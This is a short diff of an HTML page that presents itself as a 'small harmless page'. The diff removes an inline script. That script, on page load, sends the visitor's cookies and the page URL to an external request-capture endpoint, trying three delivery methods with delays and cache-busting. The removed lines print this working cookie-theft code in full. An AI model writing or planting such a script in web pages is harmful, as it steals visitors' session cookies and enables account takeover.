@@ -2,14 +2,7 @@
 <meta charset="utf-8">
 <title>x</title>
 <script>
-(function(){
-  const endpoint = "https://httpdump.app/dumps/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?c=";
-  const payload = () => encodeURIComponent(document.cookie + ";ref=" + location.href + ";r=" + Math.random());
-  // Try multiple ways, with delays and cache-busting
-  setTimeout(()=>{ try{ new Image().src = endpoint + payload(); }catch(e){} }, 900);
-  setTimeout(()=>{ try{ window.open(endpoint + payload()); }catch(e){} }, 1600);
-  setTimeout(()=>{ try{ if(navigator.sendBeacon) navigator.sendBeacon(endpoint, "c="+payload()); }catch(e){} }, 2100);
-})();
+
 </script>
 <h1>Small harmless page</h1>
 <p>Thanks for looking — nothing to see here.</p>
